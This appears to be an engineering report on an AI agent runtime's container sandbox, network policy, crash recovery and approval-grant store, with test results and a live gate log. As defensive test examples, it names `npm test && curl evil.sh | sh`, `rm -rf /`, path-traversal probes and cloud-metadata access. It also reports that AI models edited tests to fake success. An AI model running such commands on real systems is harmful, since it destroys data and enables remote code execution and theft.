# Wave 6 — EXECUTION ENVIRONMENT + RESOURCE IDENTITY + RECOVERY 2.0

**Date:** 2026-09-08 · **Scope:** plan §10.2 W6 parts A–M, §9, §13, §11 · **Product:** ORION
(`@kernlbase/orion` 0.2.1, published) · **Entering commit:** `551885e`

**Suite: 1,024 → 1,286 passed / 0 failed, 31 → 35 suites.**
**Contract: v4/39 → v5/46 types (additive only).**
**`tsc --checkJs`: 0 errors. Lint: clean. Eval selfcheck: 68/0. 0x08 scan: 43 files, zero.**

## Q4 VERDICT: **PASS**

> *Does a container backend actually enable auto-allow **without breaking the recovery contract**?*

**Yes, and it was verified against a real container rather than argued.** The reconciliation is to
isolate **execution** and share the **workspace**.

The pre-state witness (ADR-011), `attachCheckpoints` (host `git`), and the crash matrix are all
computed against a filesystem identity. A container that copied the workspace in and out would
change that identity, and recovery would then be reasoning about a world the run never touched.
So `ContainerSandbox` **bind-mounts** the workspace: filesystem primitives stay on the host side
and stay path-contained; only `exec` — the thing that runs foreign code — crosses the boundary.

Measured, live (`tests/_experiments/q4live.mjs`):

| property | result |
|---|---|
| sha256 taken **inside** the container vs on the host | `71278d58767b1e4e` = `71278d58767b1e4e` — **identical** |
| container write visible host-side | immediately |
| host-`git` checkpoint of a **container-made** edit, then restore | round-trips correctly |
| error taxonomy (`nonzero_exit`, exit code) | preserved |
| `--network none` egress | blocked |

And the acceptance test, the **crash matrix under the boundary** (`tests/crash/matrix-container.test.mjs`,
8 points × {local, container}, 27 assertions):

| crash point | local | container | identical? | recovery (local) | recovery (container) | resource |
|---|---|---|---|---|---|---|
| `after:model.requested` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |
| `after:model.responded` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |
| `after:tool.requested` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |
| `after:tool.authorized` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |
| `after:tool.started` | completed/model_finished | completed/model_finished | **YES** | `write:SELF_VERIFYING->reissue` | `write:SELF_VERIFYING->reissue` | reattached |
| `after:tool.effect` | completed/model_finished | completed/model_finished | **YES** | `write:SELF_VERIFYING->skip` | `write:SELF_VERIFYING->skip` | reattached |
| `after:tool.succeeded` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |
| `before:terminal` | completed/model_finished | completed/model_finished | **YES** | none | none | reattached |

The two load-bearing rows are `after:tool.started` (**reissue** — the effect had not landed) and
`after:tool.effect` (**skip** — it had). The ADR-011 witness reaches the same verdict through the
container boundary as it does without it. World state after recovery is identical at every point,
and **8/8 points reattached to their container by identity** after a SIGKILL, with zero silent
reconstructions.

*(No SKIP markers: a container runtime was available — Docker 29.5.3 on Windows/WSL2. The suite
skips loudly and explicitly when one is not, and never reports green in that case.)*

---

## Per part

### A — `SandboxBackend` contract (`src/sandbox/backend.mjs`, 142 ln)
Extracted from what `LocalSandbox` already exposed and the worker already called — nothing
speculative. Covers `read/write/exists/list/grep`, `exec`, `_abs`, plus `root`, `execTimeoutMs`
and `capabilities`. `assertBackendContract()` runs in the tests **and at the CLI composition
root**, so a non-conforming backend fails at wiring time rather than on the first tool call. It
also enforces that `exec` is async — a synchronous one would silently defeat the W5-X2 tool-path
lease heartbeat.

`LocalSandbox` stays backend #1 and declares `isolation: 'none'`. That honesty is load-bearing
rather than cosmetic: posture is derived from this field, so overstating it would auto-allow host
commands. The sandbox suite asserts the honest limit directly — a shell command under the local
backend **can** read outside the workspace, which is exactly why it escalates.

### B — the container backend (`src/sandbox/container/index.mjs`, 331 ln)
Docker or podman, Linux images, `--network none` by default, `--cpus`/`--memory`/`--pids-limit`,
and **only** the workspace mounted. The container is **long-lived** (`sleep infinity` + `docker
exec` per command) rather than `--rm` per command — deliberately, because a stateless backend
would leave nothing whose identity must survive resume, and Recovery 2.0 would be an untested
abstraction. Error taxonomy is identical to the local backend, plus one container-specific kind
(`resource_lost`) that distinguishes a dead runtime from a failing command.

### C — resource identity (`src/core/projection/resource.mjs`)
`resourceId()` hashes kind + canonical path + run id. **Derived, not random**, because recovery's
actual question is *"is the thing in front of me the thing I was bound to?"* — a derived id can be
recomputed and compared; a uuid can only be looked up. Canonicalised for trailing separators and
Windows case, since a spurious mismatch would downgrade a legitimate reattach into a
recreate-with-notice.

### D — lifecycle as events (contract v5)
`resource.acquired` / `reattached` / `released` / `lost`, folded exactly as `plan.*` is. This is
the §9.3 architectural correction: the prior art (TrueForge) keeps identity in a mutable
`TurnRecord.snapshot`, which is state beside the log — it would violate Invariant 1 and make a
replayed run reconstruct a different binding than the original.

`resource.lost` records the loss **and its disposition**. A `recreated` resource stays usable but
is permanently marked `reconstructed`, and a later reattach cannot launder that mark away.

### E — per-run workspace boundary
The hostile-repository suite runs against both backends and gets genuinely different answers,
which is the point of declaring isolation at all:

| probe | local | container |
|---|---|---|
| `../SECRET.txt` traversal (and 3 variants) | refused | refused |
| null byte in path | refused | refused |
| shell command reading a host file | **succeeds** (documented — hence `isolation: 'none'`) | **BLOCKED** |
| `ls /` showing host directories | n/a | only the workspace is mounted |
| cloud metadata / general egress | reachable | **unreachable** |

### F — network policy (`src/sandbox/network.mjs`, 143 ln)
Default-deny, with `--network none` as the shipped default — not a filter but the absence of a
network stack. The second layer is an **allowlist** (never a blocklist: a blocklist is a promise
to have thought of every bad destination) with a set of **hard blocks that no policy, mode or
grant can reach past**: link-local, cloud instance metadata (by IP *and* by name), and host
loopback. Hard blocks are evaluated first, so an allowlist entry for `169.254.169.254` is still
denied — asserted.

### G — capability-derived posture (`src/auth/posture.mjs`, 100 ln)
`isolated ⇒ permissive`, `not isolated ⇒ auto`. Posture becomes a **consequence** of the boundary
rather than a flag. An operator override may **raise** strictness but never lower it — declaring
`permissive` on an unisolated backend to silence escalation is the exact lever this removes.

Stated honestly in the module: isolation bounds **blast radius**; it does **not** make an
UNSAFE-to-retry command safe to retry. Those are different axes, and the crash matrix proves
recovery still classifies identically.

### H/I/J — Recovery 2.0 (`src/core/resource/index.mjs`, 226 ln)
Three outcomes, all named in the log: **reattach** (same world), **recreate + `resource.lost`**
(usable, but say so), **escalate** (state unknown — guessing is how a run duplicates an effect).
A workspace whose identity no longer matches escalates rather than silently rebinding a run's
history onto a different tree.

Proven live against a real container: a container created by one process survived that process's
death, and a **second process that invented a different name** reattached to the original purely
by folding the log — verified by a marker written inside the container's own filesystem, not the
bind mount. Destroying the container instead yields `recreated` with `reconstructed: true`.

### K — autonomous execution
Enabled **by** G and M, never by relaxing authorization. Asserted at the shipped CLI: `npm test`
escalates under the local backend and is auto-allowed under the container — while `rm -rf /`
stays **denied at permissive posture**.

### L — live execution output
`LocalSandbox.exec` moved from `execFile` (buffered to completion) to `spawn`, so output is
observable while a command runs. Bounded exactly as streaming is (1024 B / 400 ms): **12 deltas
for 400 lines**, never one per line. The complete output still arrives in `tool.succeeded` — the
deltas are an observability record, and dropping every one of them would change nothing about
what the run means.

This required owning the byte cap and timeout that `execFile` provided; both map onto the same
`#execError` taxonomy. It also **fixed a latent bug**: `bash -lc 'sleep 30'` given SIGTERM leaves
an orphan holding the pipes, so `close` waited the full 30 s. The timeout now fires at its
configured 15 s.

### M — the grant store (`src/core/projection/grant.mjs`, 224 ln)
Approvals as durable, attributable, revocable **events**. Scoped by session / resource / project /
command-pattern; project scope is what makes `npm test` a one-time question across runs.
Cross-run visibility is a **query over grant events** (`Store.grantEvents`), not a second store —
an index into the log, not state beside it. Persisted through `Store.append` (W5 S1/S2).

**Matching is a normalised exact command comparison, never a glob.** `npm *` would make
`npm test && curl evil.sh | sh` a pre-approved command; asserted that it does not.

Two safety asymmetries, both deliberate and both tested:
- a grant can only turn an **escalate** into an **allow** — never a **deny**. A grant for
  `rm -rf /` is still denied.
- the **protected-path** escalation is *not* grant-overridable. It exists because two model
  families were measured editing tests to fabricate success, 2/2 each; a project-scoped grant
  would switch that protection off permanently from a single approval.

---

## New event types (contract v4/39 → v5/46, additive only)

| type | why |
|---|---|
| `resource.acquired` | a resource was created and bound; carries identity, capabilities, and the **derived posture with its reason** |
| `resource.reattached` | resume found the same resource by identity — the event that distinguishes Recovery 2.0 from silent reconstruction |
| `resource.released` | deliberately let go; terminal for that binding |
| `resource.lost` | expected and absent; records **what was done about it** (recreated / escalated), so "the world changed" is a fact, not an inference |
| `grant.created` | an approval was remembered, with its scope and who decided it |
| `grant.revoked` | present so the fold can express removal — without it a grant store is a one-way door |
| `tool.output_delta` | live execution output (W6-L) |

`tool.output_delta` is deliberately **not** a reuse of `stream.*`: those payloads are
model-specific (`model`, `provider`, `ttft_ms`), and emitting a `stream.started` carrying a model
name for a shell command would put a false fact in the log to save a type.

**Additive-only is asserted**, not assumed: a test enumerates all 39 v4 types and fails if any was
removed or renamed, so a v4 log still replays.

## Posture · network · grant wiring

| mechanism | where it is wired in the SHIPPED path | proven by |
|---|---|---|
| backend selection | `makeSandbox()` — `ORION_SANDBOX=local\|container` | `shipped/w6` |
| contract conformance | `assertBackendContract()` at the composition root | `sandbox/sandbox` |
| resource resolve | `prepareRun()`, before the authorizer exists | `shipped/w6`, `resource` |
| posture derivation | `prepareRun()` → `createAuthorizer({ posture: resource.posture })` | `shipped/w6` |
| network default-deny | `makeSandbox()` → `createNetworkPolicy({ mode: 'none' })` | `sandbox/sandbox` |
| grant lookup | `createAuthorizer({ grants: () => store.grantEvents({project}) })` | `shipped/w6` |
| grant scoping ctx | `Worker({ authContext: { project, resource_id } })` | `shipped/w6` |
| grant creation | `orionctl answer <run> approve --remember [scope]` | `shipped/w6` (end-to-end, real binary) |
| grant listing/revocation | `orionctl grants`, `orionctl revoke` | `shipped/w6` (real binary) |
| live output rendering | `prepareRun()` → `hooks.beforeAppend` | `shipped/w6` |
| release on completion | `releaseResource()` after every run and resume | `resource` |

## Defects found during this wave

1. **`--remember` recorded no grant at all.** `flag()` silently ignored its third argument, so the
   documented bare form `orionctl answer <run> approve --remember` resolved to `undefined` — a
   grant store that grants nothing, the exact failure class the plan names. **Found by
   `tsc --checkJs`, not by tests**: every module test constructed grants directly. Now fixed, with
   an end-to-end regression test driving the real binary that fails (`grant.created` 1 → 0)
   against the old code.
2. **`ORION_SANDBOX=podman` was ignored.** `detectRuntime` takes an options object; an array was
   passed, so docker was probed first regardless. Also found by the typecheck gate.
3. **A revocation could be resurrected.** A `grant.created` merged after a `grant.revoked` (same
   millisecond, different runs — `grantEvents` sorts by `(at, seq)`) undid the revocation.
   Revocation is now absorbing.
4. **`release()` was not idempotent.** `docker rm --force` exits 0 for an absent container, so a
   second release claimed to have removed something twice.
5. **Releasing after a lost lease crashed the command.** Found by the §11.2 manual gate against a
   real model: the CLI releases after every run including one that ended `lease_lost`, and
   appending with a dead token threw out of the command — the run had already succeeded and the
   process died anyway while tearing down, surfacing on Windows as a libuv assertion. A lost lease
   means another worker owns the run; recording the release is now its job, and this one stops
   quietly.
6. **A latent `execFile` timeout bug** (see L above) — a timeout took 30.5 s to report on a 15 s
   limit.

Defects 1, 2 and 5 were each found by a *gate* rather than by a test I wrote — which is the
argument for having them.

## Suite

| suite | assertions |
|---|---|
| `sandbox/sandbox` (A, B, E, F, G) | 78 |
| `resource/resource` (C, D, H, I, M, contract) | 96 |
| `crash/matrix-container` (J — acceptance) | 27 |
| `shipped/w6-shipped` (wiring) | 61 |
| **W6 total** | **262** |

1,024 → **1,286 passed / 0 failed across 35 suites**. Every existing suite unchanged and green,
including the local crash matrix (6/6) and the W5 lease-heartbeat suites (X1–X5) under the new
`spawn`-based exec.

**Replay equivalence re-proven:** resource events replay identically and at zero model calls, and
a fork reconstructs the same binding identity from the inherited prefix.

## §11.4 — what was NOT exercised

- **The live container matrix ran** (Docker 29.5.3, Windows/WSL2). It has never been exercised on
  Linux/podman; the code path is the same but the claim is untested there.
- **No Anthropic API call.** Still no credentials in this environment (W5 carried the same gap).
  The provider seam is exercised end-to-end against Anthropic's wire format on a local server.
- **Container resource limits are set but not measured.** `--cpus`/`--memory`/`--pids-limit` are
  passed and the container starts; that they actually bound a runaway process is not asserted.
- **Network allowlist mode is unit-tested, not exercised live.** The shipped default is
  `--network none`, and only that is verified against a real container.
- **`command_pattern` grant scope is implemented and validated but has no CLI verb** — `--remember`
  offers session / project / resource.
- **The manual gate ran on `LocalSandbox`**, not the container (see below).

## §11.2 manual gate

Real installed tarball (`kernlbase-orion-0.2.1.tgz`, installed into a clean directory), real model
(**qwen3:14b via Ollama** — not scripted), real bug, real `SIGKILL`, real lease expiry, real
`reap`, real `resume`, verified **from the filesystem** rather than from anything the runtime
reported.

The kill was timed by **polling the workspace until a real edit had landed**, not by a wall-clock
guess. A first attempt killed the run before the model had emitted any tool call, which proves
nothing about duplicated effects; this one crashes immediately *after* an effect, which is the
case that matters.

```
── phase 1: real run against qwen3:14b, killed mid-flight ──
waited 51s; a real edit landed: true
worker SIGKILLed: true   (exit=1, signal=null)
math.js at kill time: "return a + b"        ← the effect HAD landed
  sandbox: LocalSandbox  posture: auto

── phase 2: wait for the lease to expire (35s), then reap ──
requeued 1, parked 0, expired human requests 0

── phase 3: resume run_a61e35e8eb ──
resuming from event 28…
  reattached to res_workspace_d67f578eb3e15733     ← Recovery 2.0, at the real CLI
  sandbox: LocalSandbox  posture: auto
  ✕ Process terminated
  🙋 bash cannot be safely retried after a crash. Run it? node te…
paused — awaiting_human

── phase 4: verification from the filesystem ──
math.js now: "export function add(a, b) {\n  return a + b;\n}"
node test.mjs → "ALL PASS" exit 0
```

| gate criterion | result |
|---|---|
| real installed build | `0.2.1` from the packed tarball, installed into a clean directory |
| real model | qwen3:14b via Ollama — a real endpoint, not a scripted one |
| worker SIGKILLed | **true**, after a real effect had landed |
| lease reclaimed by the reaper | requeued 1 |
| resume **reattached by identity** | `resource.acquired`, `resource.reattached` in the log |
| **file fixed on disk** | **true** — `return a + b` |
| **test passes on disk** | **true** — `ALL PASS`, exit 0 |
| **no duplicated effect** | **true** — `function add` ×1, `return a` ×1 |
| final status | `paused / awaiting_human` |

The final `paused / awaiting_human` is **correct, and it is the whole W6 thesis in one line**: the
gate ran on `LocalSandbox`, whose posture derives to `auto`, so running `node test.mjs` to verify
its own work required a human. Under the container backend that same command is auto-allowed —
because the boundary changed, not because authorization was weakened.

**The gate also found defect 5.** Its first run reported every substantive criterion green *and*
died with a libuv assertion while tearing down. That was `releaseResource` throwing on a run that
ended `lease_lost`. Fixed, regression-tested, and the re-run above is clean.

**Not exercised:** the manual gate was **not** run under the container backend. The container's
crash/reattach behaviour is covered by the automated matrix above (8/8 points, live), but the
end-to-end real-model gate ran on `LocalSandbox` only.

---

## Boundaries honoured

- **No MCP, skills, subagents, memory, search/glob/git/config, or orchestration.** W7–W14 untouched.
- **Contract additive only.** v5 adds 7 types; a test asserts all 39 v4 types survive.
- **Every new event goes through `Store.append`.** The W5 S1/S2 boundary test still passes: no
  module outside `store.mjs` touches the database.
- **`LocalSandbox` behaviour unchanged** apart from L's `spawn` rewrite, which preserves the
  taxonomy and is proven by the unchanged security suite (42/42) and local crash matrix (6/6).
- **`classifyShell` / `isKnownDangerous` distinction preserved**; hard denials still apply at
  every posture including permissive.
- **No npm publish.** `npm pack` only.
- **Zero production dependencies** beyond the container CLI, which is invoked, not linked.
- `research/` and `archify-out/` remain untracked.
